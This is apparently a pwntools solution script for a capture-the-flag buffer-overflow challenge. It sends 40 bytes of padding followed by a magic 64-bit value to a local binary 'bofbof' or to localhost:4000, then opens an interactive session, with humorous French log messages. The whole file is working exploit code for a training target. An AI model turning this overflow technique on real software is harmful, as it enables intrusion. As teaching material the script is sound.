#!/usr/bin/env python
# coding: utf-8

import pwn
import argparse

# pwn.context.log_level = "debug"
shell = "localhost"
port = 4000
winArg = 0x1122334455667788
padding = pwn.cyclic(40)
payload = padding + pwn.p64(winArg)
binary = "./bofbof"


def startExploit(isOnline):
    try:
        if isOnline:
            Online()
        else:
            Local()
    except:
        pwn.error("C'était un accident ! UN BANAL ACCIDENT DE TRAPÈZE")
    finally:
        pwn.info("Ah ! C'était donc ça tout ce tintouin.")


def Local():
    pwn.context.binary = binary
    pwn.info("Mais qu'est-ce que c'est que ce guet-apens ?!")
    stdout = pwn.process.PTY
    stdin = pwn.process.PTY
    target = pwn.process([binary], stdout=stdout, stdin=stdin)
    target.sendlineafter(">>>", payload)
    target.interactive()


def Online():
    pwn.info("C'est pas moi ! j'ai vu, je sais qui c'est, mais je ne dirais rien !")
    conn = pwn.remote(shell, port)
    conn.recvline()
    conn.sendlineafter(">>>", payload)
    conn.interactive()


def main():
    parser = argparse.ArgumentParser(
        description="Executer Hubert en ligne ou local", prog="Exploit.py"
    )
    parser.add_argument(
        "-o",
        "--online",
        dest="isOnline",
        help="Hubert en mode online",
        action="store_true",
        default=False,
    )
    args = parser.parse_args()
    if args.isOnline:
        Online()
    else:
        Local()


if __name__ == "__main__":
    main()
